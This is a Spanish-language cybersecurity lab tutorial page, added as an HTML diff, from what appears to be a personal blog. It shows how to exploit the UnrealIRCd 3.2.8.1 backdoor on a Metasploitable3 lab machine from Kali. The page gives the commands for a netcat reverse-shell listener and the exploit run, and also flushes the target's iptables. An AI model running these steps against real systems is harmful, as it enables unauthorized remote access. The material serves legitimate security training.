@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="../../img/barbilla carmesí.jpeg">
+    <link rel="stylesheet" href="../../css/style.css">
+    <title>BlogMadWormmon</title>
+</head>
+<body>
+<header>
+        <nav>
+            <ul class="navbar">
+                <li><a href="../../index.html">Home</a></li>
+                <li><a href="./01.html">CyberSecurity</a></li>
+                <li><a href="../hardwareSoldering/01.html">HardwareSoldering</a></li>
+                <li><a href="../jpFanTranslation/01.html">JpFanTranslations</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <div class="center">
+        <form style="display: inline" action="../../index.html" method="get">
+          <button class="button"><a href="../../index.html">Home</a></button>
+          <button><a href="./01.html">1</a></button>
+          <button><a href="./02.html">2</a></button>
+          <button><a href="./03.html">3</a></button>
+          <button><a href="./04.html">4</a></button>
+          <button><a href="./05.html">5</a></button>
+          <button><a href="./06.html">6</a></button>
+        </form>
+    </div>
+
+    <div class="box1">
+        <h3>Ejercicio práctico</h3>
+        <p>Descarga una máquina kali y <a href="https://portal.cloud.hashicorp.com/vagrant/discover/rapid7/metasploitable3-ub1404">esta</a> máquina exploitable Ubuntu</p>
+        <p><span class="spanR">descomprímela 1 vez, descomprímela de nuevo</span> e instálala, el usuario es <span class="spanR">vagrant</span> y la contraseña también <span class="spanR">vagrant</span>, tenemos que desactivar las iptables, por lo que usad <span class="spanR">sudo iptables -S</span> para ver las iptables, luego haz un <span class="spanR">sudo iptables -F</span> para eliminarlas</p>
+        <img src="../../img/nmap38.jpg" alt="">
+        <p>Comprueba la ip de la máquina linux con <span class="spanR">ip a</span></p>
+        <p>Con esto ya está terminado el setup</p>
+    </div>
+
+    <div class="box1">
+        <p>Pongamos a prueba lo recopilado y obtenido hasta ahora</p>
+        <p>Habíamos encontrado en la sección anterior un fallo de seguridad grave, concretamente <span class="spanR">UnrealIRCd-3.2.8.1-Backdoor</span>, intentemos explotarlo.</p>
+        <p>descarguemos el exploit en la máquina Kali: <a href="https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/tree/master" target="_blank">Aquí</a></p>
+        <p>Lo movemos a una carpeta en el escritorio y lo unzippeamos con <span class="spanR">unzip UnrealIRCd-3.2.8.1-Backdoor-master</span></p>
+        <p>Tendremos un archivo <span class="spanR">exploit.py</span> y otro <span class="spanR">README.md</span>, y abrimos el exploit.py con un editor de texto, en mi caso usaré <span class="spanR">emacs</span> pero podéis usar pico, nano o cualquiera, este exploit es un <span class="spanR">reverse connection</span></p>
+        <img src="../../img/nmap36.jpg" alt="">
+        <p>Cambiamos la <span class="spanR">IP</span> y el <span class="spanR">puerto</span> al que queramos que conecte con nosotros, <span class="spanR">usaremos netcat </span> para escuchar en el puerto que hemos especificado en el exploit con: <span class="spanR">nc -l -p 4433</span> y comprobar si funciona el exploit</p>
+        <img src="../../img/nmap37.jpg" alt="">
+    </div>
+
+    <div class="box1">
+        <p>Una vez esté todo preparado, con el listener activado con <span class="spanR">netcat</span> ejecutamos el payload con <span class="spanR">./exploit.py 192.168.x.x x -payload python</span> el número después de la <span class="spanR">IP</span> correspondería al <span class="spanR">puerto</span>, en este caso, sería: <span class="spanR">./exploit.py 192.168.74.131 6667 -payload python</span>.</p>
+        <img src="../../img/nmap39.jpg" alt="">
+        <p>Como podemos ver en la terminal de la izquierda hemos <span class="spanR">enviado el payload successfully</span>, si no hay problemas y todo ha salido bien, en la terminal de la derecha, debería salirnos: <span class="spanR">boba_fett@ubuntu:/opt/unrealircd/Unreal3.2$</span>, como se observa en la máquina.</p>
+        <p>Ya habríamos tomado acceso remoto a la otra máquina, probemoslo: <span class="spanr">usemos <span class="spanR">ls</span> en la consola de la derecha (la de netcat)</span></p>
+        <img src="../../img/nmap40.jpg" alt="">
+    </div>
+
+    <div class="box1">
+        <h3>Más comprobaciones</h3>
+        <p>Prueba ir a la máquina Ubuntu y crea un archivo, entonces léela en tu máquina Kali</p>
+        <p>Máquina Ubuntu: </p>
+        <img src="../../img/nmap41.jpg" alt="">
+    </div>
+
+    <div class="box1">
+        <p>Máquina Kali: </p>
+        <img src="../../img/nmap42.jpg" alt="">
+    </div>
+
+    <div class="box1">
+        <p>Probemos crear un archivo con <span class="spanR">echo</span> desde la máquina Ubuntu y leámoslo</p>
+        <img src="../../img/nmap43.jpg" alt="">
+    </div>
+
+    <div class="box1">
+        <h3>Con esto ya habríamos conseguido ganar acceso remoto a la máquina Ubuntu</h3>
+    </div>
+
+    <footer><p>2025 &copy;</p> <p>MadWormmon</p></footer>
+</body>
+</html>
